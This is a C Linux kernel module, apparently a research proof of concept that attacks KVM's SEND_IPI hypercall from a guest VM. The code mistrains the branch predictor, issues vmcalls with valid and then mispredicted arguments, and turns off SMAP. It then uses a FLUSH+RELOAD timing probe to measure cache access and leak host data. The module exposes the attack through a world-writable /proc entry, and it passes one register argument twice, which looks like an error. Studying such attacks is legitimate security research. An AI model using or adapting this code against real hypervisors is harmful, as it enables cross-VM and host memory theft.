// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "hypercall.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_send_ipi;

static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }

// From figure 4 of Yarom and Falkner, “FLUSH+RELOAD: A High Resolution, Low Noise,
// L3 Cache Side-Channel Attack.”
static inline __attribute__((always_inline)) size_t access_time(void __user *ptr) {
  volatile unsigned long time;

  asm volatile(
      // From x86 docs
      // If software requires RDTSC to be executed only after all previous
      // instructions have executed and all previous loads and stores are
      // globally visible, it can execute the sequence MFENCE;LFENCE
      // immediately before RDTSC.
      "mfence\n"
      "lfence\n"
      "rdtsc\n"

      // From x86 docs
      // If software requires RDTSC to be executed prior to execution of any
      // subsequent instruction (including any memory accesses), it can execute
      // the sequence LFENCE immediately after RDTSC.
      "lfence\n"

      "movl %%eax, %%esi\n"
      "movl (%1), %%eax\n"

      "lfence\n"
      "rdtsc\n"
      "subl %%esi, %%eax\n"
      : "=a"(time)
      : "c"(ptr)
      : "%esi", "%edx");
  return time;
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  int type = KVM_HC_SEND_IPI;

  // Confuse the branch predictor
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx");

  // Do the vmcall once with valid values
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.real.mask_low), "+c"(opts.real.mask_low), "+d"(opts.real.min),
                 "+S"(opts.real.icr.raw_icr));

  // Flush our buffer
  disable_smap();
  clflush(opts.ptr);

  // Do the vmcall, this time with the mispredicted buffer
  type = KVM_HC_SEND_IPI;
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.mispredicted.mask_low), "+c"(opts.mispredicted.mask_low),
                 "+d"(opts.mispredicted.min), "+S"(opts.mispredicted.icr.raw_icr));

  // Measure the access time
  size_t time = access_time(opts.ptr);
  enable_smap();
  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (NULL == proc_root) {
    proc_remove(proc_root);
    pr_alert("Error:Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }
  pr_info("/proc/%s created\n", procfs_root_name);

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (NULL == proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }
  pr_info("/proc/%s/%s created\n", procfs_root_name, procfs_ipi_name);
  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
